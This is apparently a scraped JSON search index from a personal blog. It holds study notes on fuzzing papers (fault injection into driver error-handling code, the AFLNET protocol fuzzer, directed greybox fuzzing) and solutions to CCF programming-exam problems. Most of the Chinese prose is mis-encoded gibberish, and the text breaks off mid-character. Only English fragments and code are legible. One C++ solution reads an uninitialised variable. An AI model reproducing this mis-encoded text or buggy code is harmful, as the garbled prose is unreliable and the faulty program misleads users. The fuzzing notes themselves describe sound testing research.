å…¶å®å’Œä¸Šä¸€ç¯‡ä¸€æ ·ï¼Œå¯¹error-siteçš„æ¨¡ç³Šæ˜¯ä½•æ„ï¼Ÿæ—¢ç„¶æ˜¯ä¸ºäº†æå‡è¦†ç›–ç‡ï¼Œå…¨ç»™ä»–è§¦å‘ä¸å°±è¡Œäº†ä¹ˆã€‚ å…·ä½“æ¯ä¸ªæ­¥éª¤æ˜¯å¦‚ä½•å®ç°çš„ï¼Œä½œè€…å¹¶æ²¡æœ‰å¼€æºä»£ç  æ”¶è· å…¶å®è¿™ç¯‡æ–‡ç« æœ€å¤§çš„æ”¶è·å°±æ˜¯å¦‚ä½•å°†ä¸€ç¯‡Bæ‰©å……åˆ°ä¸€ç¯‡Aã€‚è¿™ç¯‡æ–‡ç« æ˜¯åŸºäºFuzzing Error Handling Code in Device Drivers Based on Software Fault Injectionè¿›è¡Œå‡çº§çš„ï¼Œç›¸è¾ƒäºåŸæ¥çš„æ–‡ç« ï¼Œä½œè€…åšå‡ºäº†ä»¥ä¸‹å‡ ç‚¹æå‡ï¼š\nåœ¨åŸå…ˆçš„åŸºç¡€ä¸Šå¯¹error-siteå¢åŠ äº†ä¸Šä¸‹æ–‡â€”â€”æ¨¡å‹å»ºæ¨¡æ›´ç²¾ç»†åŒ–ï¼Œå¤æ‚åŒ– error-siteæå–çš„æ—¶å€™ï¼Œè€ƒè™‘äº†åº“å‡½æ•°çš„æƒ…å†µï¼Œè€Œä¸”é‡‡ç”¨äº†ç»Ÿè®¡çš„æ–¹æ³•è¿›ä¸€æ­¥æé«˜è¯†åˆ«çš„ç²¾åº¦â€”â€”æ–¹æ³•æ­¥éª¤å¤æ‚åŒ–ï¼Œå¢åŠ æœªæ›¾è€ƒè™‘çš„æƒ…å†µ ä¸å†åªèšç„¦äºé©±åŠ¨ç¨‹åºï¼Œå°†èŒƒå›´æ‰©å¤§åˆ°æ‰€æœ‰ç¨‹åº åœ¨fuzzè¿‡ç¨‹ä¸­å¢åŠ äº†ä¼ ç»Ÿfuzzï¼Œä¹‹å‰åªæœ‰å¯¹error-sites sequenceçš„fuzz ç›®çš„ï¼š æ–¹æ³•ï¼š æ„ä¹‰ï¼š æ•ˆæœï¼š\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/fuzzing-error-handling-code-using-context-sensitive-software-fault-injection/","summary":"ä¸­æ–‡è¯‘åï¼šä½¿ç”¨ä¸Šä¸‹æ–‡æ•æ„Ÿè½¯ä»¶æ•…éšœæ³¨å…¥æ¨¡ç³ŠåŒ–é”™è¯¯å¤„ç†ä»£ç  ä½œè€…ï¼šè’‹mingzhu å•ä½ï¼šæ¸…åå¤§å­¦ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2020å¹´ æ¥æºï¼š #USENIX","title":"Fuzzing Error Handling Code using Context-Sensitive Software Fault Injection"},{"content":"ä¸­æ–‡è¯‘åï¼šåŸºäºè½¯ä»¶æ•…éšœæ³¨å…¥çš„è®¾å¤‡é©±åŠ¨ç¨‹åºæ¨¡ç³Šé”™è¯¯å¤„ç†ä»£ç  ä½œè€…ï¼šè’‹mingzhu å•ä½ï¼š æ¸…åå¤§å­¦ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2019å¹´ æ¥æºï¼š #IEEE_ISSRE_CCFB å…³é”®å­—ï¼š #fuzzing #æ•…éšœæ³¨å…¥ ä»£ç åœ°å€ï¼š ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-06-27 17:15\nAbstract much error handing code in drivers is triggered by occasional errors (such as insufficient memory and hardware malfunctions) that not related to inputs this method based on software fault injection firstly, at complie time, FIZZER uses static analysis to reccommend possible error sites that can trigger error handling code. Then, during driver execution, by analyzing runtime information, it automatically fuzzes error-site sequences for fault injection to improve code coverage. Background current fuzzing approches for driver has two limitations:\ncannot generate original driver inputs PeriScope can simulate and fuzz the driver inputs from the hardware device to perform runtime testing cannot effectively cover error handling code take SFI to cover error handling code at runtime The author thinks that there are two kinds of errors in general, one is input-related error and the other is occasional errors The authors surveyed the error handling code in the Linux kernel and the errors committed by skzkaller to find out how many of these error handling code and bugs were related to occasional errors.\nMethodology basic idea error site: some function can trigger some fault then trigger the error handling code error-site sequence: multiple eorror sites ordered by their static positions in the driver source code author regard error-site sequences as the \u0026ldquo;inputs\u0026rdquo; of possibly encountered error, and then fuzz these sequences to cover the error handling code method statically identify error sites in the driver code run the driver, and then according to the runtime information of the driver, use a coverage-based mutation method to generate error-site sequences to cover error handling code Initial mutation: åˆå§‹error-siteåºåˆ—æ˜¯å…¨é›¶ï¼Œç„¶åæ‰§è¡Œä¸€æ¬¡fuzzï¼Œå…¶ä¸­å¯èƒ½æœ‰çš„error siteè¢«æ‰§è¡Œï¼Œå¦‚ä¸‹å›¾ä¸­é—´æ ‡Yçš„0ï¼Œé‚£ä¹ˆåˆæ¬¡å…ç–«å°±æ˜¯é’ˆå¯¹è¿™äº›æˆåŠŸæ‰§è¡Œçš„error siteçš„ï¼Œå¦‚ä¸‹å›¾å³è¾¹ã€‚ï¼ˆçªå˜æ–¹æ³•é€šè¿‡ä½¿ä¸€ä¸ªå·²æ‰§è¡Œçš„é”™è¯¯ä½ç‚¹å¤±è´¥ (0â†’1)æ¥ç”Ÿæˆæ¯ä¸ªæ–°çš„é”™è¯¯ä½ç‚¹åºåˆ—ï¼Œå› ä¸ºæ¯ä¸ªé”™è¯¯ä½ç‚¹å¯èƒ½è§¦å‘ä¸åŒçš„é”™è¯¯å¤„ç†ä»£ç ï¼‰ Subsequent mutationï¼šåœ¨é©±åŠ¨ç¨‹åºçš„åç»­æ‰§è¡Œä¹‹åï¼Œå¦‚æœä»£ç è¦†ç›–ç‡å¢åŠ  (å³è¦†ç›–æ–°çš„ä»£ç åˆ†æ”¯æˆ–åŸºæœ¬å—)ï¼Œåˆ™çªå˜æ–¹æ³•é€‰æ‹©æ­¤æ‰§è¡Œçš„é”™è¯¯ä½ç‚¹åºåˆ—ä½œä¸ºçªå˜çš„ç§å­; å¦åˆ™ï¼Œå°†æ”¾å¼ƒæ­¤é”™è¯¯ä½ç‚¹åºåˆ—ã€‚å½“è¿™ä¸ªé”™è¯¯ä½ç‚¹åºåˆ—å‘ç”Ÿçªå˜æ—¶ï¼Œä¸€æ¬¡åªæ”¹å˜ä¸€ä¸ªå·²æ‰§è¡Œçš„é”™è¯¯ä½ç‚¹ (0â†’1or1â†’0)ï¼Œå› ä¸ºæ¯ä¸ªé”™è¯¯ä½ç‚¹å¯èƒ½è§¦å‘ä¸åŒçš„é”™è¯¯å¤„ç†ä»£ç ã€‚è¿™æ ·ï¼Œçªå˜æ³•å°±äº§ç”Ÿäº†ä¸€äº›æ–°çš„é”™è¯¯ä½ç‚¹åºåˆ—ã€‚ç„¶åï¼Œå°†è¿™äº›ç”Ÿæˆçš„é”™è¯¯ä½ç‚¹åºåˆ—ä¸ä¹‹å‰ä½¿ç”¨çš„é”™è¯¯ä½ç‚¹åºåˆ—è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶åˆ é™¤é‡å¤çš„é”™è¯¯ä½ç‚¹åºåˆ—ã€‚ã€ inject faults on error sites according to the generated error-site sequences run the driver, and use the mutation method again, to generate new error-site sequences, making up a fuzzing loop. IMPLEMENTATION Error-site analyzer. It performs a static analysis of the driver source code to recommend possible error sites, from which the user should select realistic ones that can actually fail and trigger error handling code. è¯†åˆ«error-siteçš„æ ‡å‡†å°±æ˜¯æ˜¯å¦åŒæ—¶å‡ºç°ifè¯­å¥å’ŒNULLæŒ‡é’ˆæˆ–è€…éé›¶æ•´æ•°çš„è¿”å›å€¼ï¼Œç„¶åäººå·¥ä»é™æ€åˆ†æå¾—åˆ°çš„error sitesä¸­æŒ‘é€‰å‡ºçœŸæ­£ä¼šè§¦å‘error hadling codeçš„site Driver generator. It instruments the identified error sites in the driver code and generates a loadable driver. ä½¿ç”¨ä»£ç æ’æ¡©è¿›è¡Œæ•…éšœæ³¨å…¥ï¼šerror_probe ()æ„æ€å°±æ˜¯æ£€æµ‹æ­¤æ—¶çš„error-siteåºåˆ—ï¼Œçœ‹å½“å‰çš„error siteåº”ä¸åº”è¯¥è§¦å‘ï¼Œä¸‹å›¾æ˜¯ä¸ªä¾‹å­ï¼ˆè“è‰²æ˜¯æ’æ¡©ä»£ç ï¼‰ Runtime fuzzer. It uses our SFI-based fuzzing strategy to perform runtime testing. During driver execution, it collects the runtime information about the driver. Bug checkers. They check the information collected by the runtime fuzzer to detect bugs. å®ç°äº†ä¸¤ä¸ªæ£€æŸ¥å™¨æ¥æ£€æµ‹èµ„æºæ³„æ¼å’ŒåŒé”é”™è¯¯ï¼Œå¹¶ä½¿ç”¨ä¸¤ä¸ªç¬¬ä¸‰æ–¹æ£€æŸ¥å™¨ï¼Œå³KASAN[23]æ¥æ£€æµ‹å†…å­˜æŸåé”™è¯¯ï¼ŒKmemleak[24]æ¥æ£€æµ‹å†…å­˜æ³„æ¼ã€‚ Key Information ä½œè€…åœ¨æœ€å¼€å§‹ç»Ÿè®¡é”™è¯¯å¤„ç†ä»£ç çš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ–¹å¼æ‰‹åŠ¨æŸ¥æ‰¾gotoè¯­å¥å’Œè¿”å›çš„é”™è¯¯ä»£ç ï¼Œè¿™ä¸¤ç§è¯­å¥é€šå¸¸ç”¨äºLinuxå†…æ ¸ä¸­çš„é”™è¯¯å¤„ç†ä»£ç  ä½œè€…æŒ‡å‡º51%å¯ä»¥è§¦å‘é”™è¯¯å¤„ç†ä»£ç çš„ç«™ç‚¹ä¸å¶å‘é”™è¯¯æœ‰å…³ã€‚ è¿™é‡Œå˜å¼‚çš„æ—¶å€™æ¯æ¬¡åªå˜ä¸€ä¸ªerro siteæ˜¯å¦fail ç–‘é—® æ¨¡ç³Šé”™è¯¯åºåˆ—çš„æ„ä¹‰ä½•åœ¨ï¼Œæ—¢ç„¶éƒ½å·²ç»æ¢æµ‹åˆ°error siteï¼Œæˆ‘å…¨éƒ¨éƒ½è§¦å‘ï¼Œè¦†ç›–ç‡ä¸å°±æœ€å¤§äº†å— å¦‚ä½•å®ç°è‡ªåŠ¨æ’æ¡©çš„ å•¥äº‹åŒé”é”™è¯¯ double-lock bugs æ”¹è¿› è‡ªåŠ¨è¯†åˆ«error sites ç›®çš„ï¼š æ–¹æ³•ï¼š æ„ä¹‰ï¼š æ•ˆæœï¼š\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/fuzzing-error-handling-code-in-device-drivers-based-on-software-fault-injection/","summary":"ä¸­æ–‡è¯‘åï¼šåŸºäºè½¯ä»¶æ•…éšœæ³¨å…¥çš„è®¾å¤‡é©±åŠ¨ç¨‹åºæ¨¡ç³Šé”™è¯¯å¤„ç†ä»£ç  ä½œè€…ï¼šè’‹mingzhu å•ä½ï¼š æ¸…åå¤§å­¦ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2019å¹´ æ¥æºï¼š #IEEE_ISSRE_CCFB å…³é”®å­—ï¼š #fuzzing","title":"Fuzzing Error Handling Code in Device Drivers Based on Software Fault Injection"},{"content":"ä¸­æ–‡è¯‘åï¼šAFLNETï¼šç½‘ç»œåè®®ç°ç›’æ¨¡ç³Šå™¨ ä½œè€…ï¼šVan-Thuan Pham å•ä½ï¼šè’™çº³å£«å¤§å­¦ å›½å®¶ï¼š #æ¾³å¤§åˆ©äºš å¹´ä»½ï¼š #2020å¹´ æ¥æºï¼š #IEEE_ICST_CCFC å…³é”®å­—ï¼š #fuzzing ä»£ç åœ°å€ï¼š https://github.com/aflnet/aflnet ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-06-23 10:50\nç°çŠ¶ å½“å‰çš„æ¨¡ç³Šæµ‹è¯•å™¨å¯¹åè®®è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„æ•ˆæœä¸å¥½\nç¼ºä¹é’ˆå¯¹çŠ¶æ€çš„å˜å¼‚ç­–ç•¥ éœ€è¦å·²çŸ¥åè®®æ¨¡å‹ æ–¹æ³• AFLNETä½¿è‡ªåŠ¨çŠ¶æ€æ¨¡å‹æ¨ç†å’Œè¦†ç›–å¼•å¯¼æ¨¡ç³ŠååŒå·¥ä½œ; æ¨¡ç³ŠåŒ–æœ‰åŠ©äºç”Ÿæˆæ–°çš„æ¶ˆæ¯åºåˆ—æ¥è¦†ç›–æ–°çš„çŠ¶æ€ï¼Œå¹¶ä½¿çŠ¶æ€æ¨¡å‹é€æ¸æ›´åŠ å®Œæ•´ã€‚åŒæ—¶ï¼ŒåŠ¨æ€æ„å»ºçš„çŠ¶æ€æ¨¡å‹é€šè¿‡ä½¿ç”¨ä¿ç•™æ¶ˆæ¯åºåˆ—çš„çŠ¶æ€è¦†ç›–å’Œä»£ç è¦†ç›–ä¿¡æ¯ï¼Œå¸®åŠ©å°†æ¨¡ç³Šæµ‹è¯•æ¨å‘æ›´é‡è¦çš„ä»£ç éƒ¨åˆ†ã€‚ è¾“å…¥æ˜¯æ•æ‰çš„æµé‡pcapæ–‡ä»¶ ä½¿ç”¨wiresharkè‡ªåŠ¨æå–requeståºåˆ— request sequence parserç”Ÿæˆåˆå§‹ä¿¡æ¯åºåˆ—è¯­æ–™åº“ ä½¿ç”¨åè®®è§„æ ¼ä¿¡æ¯æå–å•ä¸ªè¯·æ±‚ é¦–å…ˆä»pcapæ–‡ä»¶ä¸­è¿‡æ»¤å‡ºå“åº”ï¼Œåˆ©ç”¨å“åº”è·Ÿè¸ªclientçš„è¯·æ±‚ è¯†åˆ«æ¯ä¸ªè·Ÿè¸ªä¸­æ¶ˆæ¯çš„å¼€å§‹å’Œç»“æŸï¼ˆåˆ©ç”¨ç‰¹å®šæŠ¥å¤´å’Œç»“æŸç¬¦ï¼‰ æŒ‰ç…§ç›¸åº”çš„æœåŠ¡å™¨çŠ¶æ€è½¬æ¢é¡ºåºå°†æ¯ä¸ªæ¶ˆæ¯å…³è”èµ·æ¥ï¼ˆé€šè¿‡é€ä¸ªå‘é€æ¶ˆæ¯å’Œè§£æå“åº”æ¥å®Œæˆçš„ã€‚ï¼‰ ä¿¡æ¯åºåˆ—è¯­æ–™åº“çš„å½¢å¼æ˜¯ä¿¡æ¯åºåˆ—çš„é“¾è¡¨ State Machine Learner åˆ©ç”¨æœåŠ¡å™¨å“åº”ï¼Œå¹¶ç”¨æ–°è§‚å¯Ÿåˆ°çš„çŠ¶æ€å’Œè½¬æ¢å¢å¼ºå·²å®ç°çš„åè®®çŠ¶æ€æœº (IPSM)ã€‚ é€šè¿‡æå–responseä¸­çš„çŠ¶æ€ç å®ç° AFLnetç»´æŠ¤ä¸€ä¸ªçŠ¶æ€è¯­æ–™åº“ï¼ŒåŒ…æ‹¬çŠ¶æ€æ¡ç›®åˆ—è¡¨ï¼ˆåŒ…å«çŠ¶æ€ç›¸å…³ä¿¡æ¯ï¼‰å’Œå°†çŠ¶æ€æ¡ç›®åˆ—è¡¨æ˜ å°„åˆ°å¯¹åº”ä¿¡æ¯åºåˆ—æ¡ç›®çš„å“ˆå¸Œæ˜ å°„ Target State Selectoråˆ©ç”¨IPSMçš„ä¿¡æ¯æ¥é€‰æ‹©AFLnetèšç„¦çš„ä¸‹ä¸€ä¸ªçŠ¶æ€ï¼ˆå€¾å‘äºæœªå‡ºç°ï¼Œå¾ˆå°‘å‡ºç°çš„çŠ¶æ€ï¼‰ åˆ©ç”¨å¯å‘å¼ç®—æ³• ä¾‹å¦‚é€‰æ‹©çŠ¶æ€sçš„æ¦‚ç‡å’Œå˜å¼‚åçš„æ¶ˆæ¯åºåˆ—ä¸­å·²æ‰§è¡Œäº†sçš„æ¯”ä¾‹æˆåæ¯”ï¼Œè¯´äººè¯å°±æ˜¯sæ‰§è¡Œçš„è¶Šå°‘è¶Šå®¹æ˜“è¢«é€‰æ‹© ä¸ºäº†æœ€å¤§åŒ–å‘ç°æ–°çŠ¶æ€è½¬æ¢çš„å¯èƒ½æ€§ï¼ŒAFLNETä¼˜å…ˆé€‰æ‹©åœ¨ä»¥å‰é€‰æ‹©æ—¶ç‰¹åˆ«æˆåŠŸåœ°å¢åŠ äº†ä»£ç æˆ–çŠ¶æ€è¦†ç›–ç‡çš„çŠ¶æ€ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯Target State Selectoråœ¨åˆæœŸæ˜¯éšæœºé€‰æ‹©ï¼Œåªæœ‰åœ¨ç§¯ç´¯äº†è¶³å¤Ÿå¤šçš„çŠ¶æ€ä¿¡æ¯åæ‰ä¼šå¼€å§‹åˆ©ç”¨å¯å‘å¼ç®—æ³•è¿›è¡Œé€‰æ‹© Sequence Selectoråœ¨Target State Selectoré€‰æ‹©äº†çŠ¶æ€åï¼Œåˆ©ç”¨å“ˆå¸Œæ˜ å°„é€‰æ‹©ä¸€ä¸ªå¯ä»¥åˆ°è¾¾å·²é€‰çŠ¶æ€çš„æ¶ˆæ¯åºåˆ—ï¼ˆéšæœºé€‰æ‹©ï¼‰ Sequence Mutatoræ˜¯ç”¨åè®®æ„ŸçŸ¥çš„çªå˜æ“ä½œç¬¦ï¼ˆprotocol-aware mutation operatorsï¼‰å¢å¼ºäº†AFLçš„fuzz_oneæ–¹æ³•ã€‚ åŸºäºSequence Selectoré€‰æ‹©çš„åºåˆ—Mç”ŸæˆMâ€˜, å¹¶ä¸”ä¿è¯M\u0026rsquo;åŒæ ·å¯ä»¥è¾¾åˆ°çŠ¶æ€s ä¸ºäº†ç¡®ä¿èƒ½Mâ€˜ä¹Ÿå¯ä»¥è¾¾åˆ°çŠ¶æ€sï¼ŒAFLnetå°†åºåˆ—Måˆ†ä¸ºM1ã€M2ã€M3ï¼Œåªå¯¹M2è¿›è¡Œå˜å¼‚ï¼Œç»„åˆåå¾—åˆ°M' M1æ˜¯åˆ°è¾¾çŠ¶æ€sçš„åºåˆ— M2æ˜¯å‡ºäºçŠ¶æ€sçš„åºåˆ— M3æ˜¯å‰©ä¸‹çš„åºåˆ— å˜å¼‚çš„æ“ä½œç§°ä¹‹ä¸ºåè®®æ„ŸçŸ¥çš„çªå˜æ“ä½œç¬¦ï¼Œå¾ˆé«˜å¤§ä¸Šï¼Œå…¶å®è¿˜æ˜¯å˜å¼‚çš„è€æ“ä½œï¼ˆæ›¿æ¢æ’å…¥å¤åˆ¶åˆ é™¤ï¼‰ï¼ŒåŒºåˆ«æ˜¯åº”ç”¨åœ¨æ¶ˆæ¯å±‚é¢ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œä»ç„¶ä¿ç•™äº†å­—èŠ‚çº§åˆ«çš„å˜å¼‚ å¦‚æœM\u0026rsquo;å‡ºå‘äº†æ–°çŠ¶æ€æˆ–è€…æ–°çš„çŠ¶æ€è½¬æ¢æˆ–è€…å‡ºå‘äº†serverçš„æºä»£ç çš„æ–°åˆ†æ”¯ï¼Œåˆ™ä¹Ÿä¼šè¢«åŠ å…¥è¯­æ–™åº“ åŸæ–‡ç¬¬å››é¡µç»™äº†ä¸ªä¾‹å­\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/aflnet-a-greybox-fuzzer-for-network-protocols/","summary":"ä¸­æ–‡è¯‘åï¼šAFLNETï¼šç½‘ç»œåè®®ç°ç›’æ¨¡ç³Šå™¨ ä½œè€…ï¼šVan-Thuan Pham å•ä½ï¼šè’™çº³å£«å¤§å­¦ å›½å®¶ï¼š #æ¾³å¤§åˆ©äºš å¹´ä»½ï¼š #2020å¹´ æ¥æºï¼š #IEEE_ICST_CCFC å…³é”®å­—ï¼š #fuzzing ä»£ç ","title":"AFLNET: A Greybox Fuzzer for Network Protocols è®ºæ–‡ç¬”è®°"},{"content":"å¦‚æ­¤ç¼–ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 25; int n,m; int a[N],c[N],b[N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; for(int i = 1; i \u0026lt;= n; i++) cin\u0026gt;\u0026gt;a[i]; c[0] = 1; c[1] = a[1]; for(int i = 2 ; i \u0026lt;= n; i++) c[i] = c[i-1] * a[i]; for(int i = 1; i \u0026lt;= n; i++){ b[i] = m % a[i]; m = m / a[i]; } for(int i = 1; i \u0026lt;= n; i++) cout\u0026lt;\u0026lt;b[i]\u0026lt;\u0026lt;\u0026#34; \u0026#34;; return 0; } å‡ºç°æ¬¡æ•°æœ€å¤šçš„æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int num[10005]; int main(){ int n, num_max; cin\u0026gt;\u0026gt;n; memset(num, 0, sizeof(num)); while(n--){ int si; cin \u0026gt;\u0026gt; si; num[si]++; if(num[num_max] == num[si]) num_max = min(num_max, si); else if(num[num_max] \u0026lt; num[si]) num_max = si; } cout \u0026lt;\u0026lt; num_max\u0026lt;\u0026lt;endl; return 0; } ISBNå·ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int getnumber(char x){ return x-\u0026#39;0\u0026#39;; } int main(){ string isbn; cin \u0026gt;\u0026gt; isbn; int sum, x, c; c = 1; sum = 0; for(int i = 0; i \u0026lt; 12; i++){ if(isbn[i] != \u0026#39;-\u0026#39;){ int n = getnumber(isbn[i]); sum += c * n; c ++; } } x = sum % 11; if(getnumber(isbn[12]) == x || (isbn[12] == \u0026#39;X\u0026#39; \u0026amp;\u0026amp; x == 10)) cout\u0026lt;\u0026lt;\u0026#34;Right\u0026#34;\u0026lt;\u0026lt;endl; else { if(x == 10) isbn[12] = \u0026#39;X\u0026#39;; else isbn[12] = \u0026#39;0\u0026#39; + x; cout\u0026lt;\u0026lt;isbn\u0026lt;\u0026lt;endl; } return 0; } åœ¨å†™è¿™é“é¢˜çš„æ—¶å€™å‘ç°äº†å…³äºforå¾ªç¯ä½œç”¨åŸŸçš„ä¸€ä¸ªå°ç»†èŠ‚ï¼Œforå¾ªç¯å†…å¯¹å¤–éƒ¨å˜é‡çš„åˆå§‹åŒ–åªé’ˆå¯¹forå¾ªç¯å†…éƒ¨æœ‰æ•ˆï¼ˆå¾ˆåƒå‡½æ•°ï¼‰ã€‚å½“æˆ‘åœ¨forå¾ªç¯çš„å°æ‹¬å·å†…å¯¹å˜é‡cå’Œsumåˆå§‹åŒ–åï¼Œforå¾ªç¯å†…éƒ¨æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯åœ¨å¤–éƒ¨è®¡ç®—sumå–ä½™11æ—¶ï¼Œsumçš„å€¼å°±å˜æˆï¼›ä½†æ˜¯å¦‚æœæˆ‘åœ¨å¤§æ‹¬å·å†…éƒ¨åˆå§‹åŒ–cå’Œsumå˜é‡æ—¶ï¼Œåœ¨forå¾ªç¯å¤–éƒ¨ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚\næœ€å¤§çš„çŸ©å½¢ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int h[1005]; int main(){ int n; cin\u0026gt;\u0026gt;n; memset(h, 0, sizeof(h)); for(int i = 0; i \u0026lt; n; i ++){ cin\u0026gt;\u0026gt;h[i]; } int ans = 0; for(int i = 0; i \u0026lt; n; i++){ int imax = 0; int hmin = h[i]; for(int j = i; j \u0026lt; n; j++){ hmin = min(hmin, h[j]); imax = max(hmin * (j - i + 1), imax); } ans = max(imax, ans); } cout\u0026lt;\u0026lt;ans\u0026lt;\u0026lt;endl; return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 n = int(input()) h = list(map(int, input().split())) ans = 0 for i in range(0, n): imax = 0 hmin = h[i] for j in range(i, n): hmin = min(hmin, h[j]) imax = max(hmin * (j - i + 1), imax); ans = max(imax, ans); print(ans) ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/13%E5%B9%B412%E6%9C%88ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/","summary":"å¦‚æ­¤ç¼–ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 25; int n,m; int a[N],c[N],b[N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; for(int i = 1; i \u0026lt;= n; i++) cin\u0026gt;\u0026gt;a[i]; c[0] = 1; c[1] = a[1]; for(int i = 2 ; i \u0026lt;= n; i++) c[i] = c[i-1] * a[i];","title":"13å¹´12æœˆCCFè®¡ç®—æœºè½¯ä»¶èƒ½åŠ›è®¤è¯"},{"content":"#å®šå‘fuzzing\nABSTRACT èƒŒæ™¯ï¼ˆé—®é¢˜ï¼‰ï¼šç°æœ‰ç°ç›’fuzzerä¸èƒ½è¿›è¡Œæœ‰æ•ˆçš„å®šå‘fuzz æ–¹æ³•ï¼šåŸºäºæ¨¡æ‹Ÿé€€ç«çš„power scheduleï¼Œå¯ä»¥å°†æ›´å¤šçš„èƒ½é‡åˆ†é…ç»™æ›´æ¥è¿‘ç›®æ ‡ä½ç½®çš„ç§å­ï¼ŒåŒæ—¶å‡å°‘åˆ†é…ç»™è·ç¦»ç›®æ ‡è·ç¦»æ›´è¿œçš„ç§å­çš„èƒ½é‡ã€‚ æˆæœï¼šä¼˜äºåŸºäºç¬¦å·æ‰§è¡Œçš„å®šå‘ç™½ç›’æµ‹è¯•å’Œéå®šå‘çš„ç°ç›’æµ‹è¯•ï¼›å¯ä»¥å’Œè°·æ­ŒæŒç»­æ¨¡ç³Šæµ‹è¯•å¹³å°OSS-Fuzzè¿›è¡Œæ•´åˆï¼›å¯ä»¥åœ¨å‡ ä¸ªæ¨¡ç³Šä¸æ¸…çš„å®‰å…¨å…³é”®é¡¹ç›®ï¼ˆå¦‚LibXML2ï¼‰ä¸­å‘ç°39ä¸ªbug INTRODUCTION å®šå‘fuzzçš„åº”ç”¨ï¼šè¡¥ä¸æµ‹è¯•ï¼›å´©æºƒé‡ç°ï¼›ä¿¡æ¯æµæ£€æµ‹\nåŸºäºç¬¦å·æ‰§è¡Œçš„ç™½ç›’å®šå‘æ¨¡ç³Šæµ‹è¯•çš„é—®é¢˜ï¼šè€—æ—¶é•¿\nDFGï¼šåœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬ä»‹ç»äº†å®šå‘ç°ç›’æ¨¡ç³Š(DGF)ï¼Œå®ƒä¸“æ³¨äºåˆ°è¾¾ç¨‹åºä¸­ç»™å®šçš„ç›®æ ‡ä½ç½®é›†ã€‚åœ¨é«˜å±‚æ¬¡ä¸Šï¼Œæˆ‘ä»¬å°†å¯è¾¾æ€§ä½œä¸ºä¸€ä¸ªä¼˜åŒ–é—®é¢˜ï¼Œå¹¶ä½¿ç”¨ç‰¹å®šçš„å…ƒå¯å‘å¼æ¥æœ€å°åŒ–ç”Ÿæˆçš„ç§å­åˆ°ç›®æ ‡çš„è·ç¦»ã€‚ä¸ºäº†è®¡ç®—ç§å­è·ç¦»ï¼Œæˆ‘ä»¬é¦–å…ˆè®¡ç®—å¹¶æµ‹é‡æ¯ä¸ªåŸºæœ¬å—åˆ°ç›®æ ‡çš„è·ç¦»ã€‚è™½ç„¶ç§å­è·ç¦»æ˜¯è¿‡ç¨‹é—´çš„ï¼Œä½†æˆ‘ä»¬çš„æ–°åº¦é‡åªéœ€è¦å¯¹è°ƒç”¨å›¾è¿›è¡Œä¸€æ¬¡åˆ†æï¼Œå¯¹æ¯ä¸ªè¿‡ç¨‹å†…CFGè¿›è¡Œä¸€æ¬¡åˆ†æã€‚åœ¨è¿è¡Œæ—¶ï¼Œfuzzerèšåˆæ¯ä¸ªç»ƒä¹ çš„åŸºæœ¬å—çš„è·ç¦»å€¼ï¼Œä»¥è®¡ç®—ç§å­è·ç¦»ä½œä¸ºå®ƒä»¬çš„å¹³å‡å€¼ã€‚DGFç”¨äºæœ€å°åŒ–ç§å­è·ç¦»çš„å…ƒå¯å‘å¼æ–¹æ³•è¢«ç§°ä¸ºæ¨¡æ‹Ÿé€€ç«[19]ï¼Œå¹¶è¢«å®ç°ä¸ºåŠŸç‡è°ƒåº¦ã€‚èƒ½é‡è¡¨æ§åˆ¶æ‰€æœ‰ç§å­[6]çš„èƒ½é‡ã€‚ç§å­çš„èƒ½é‡æ˜¯æŒ‡ç§å­å‘æ¯›æ‰€èŠ±è´¹çš„æ—¶é—´ã€‚åƒæ‰€æœ‰çš„ç°ç›’æ¨¡ç³ŠæŠ€æœ¯ä¸€æ 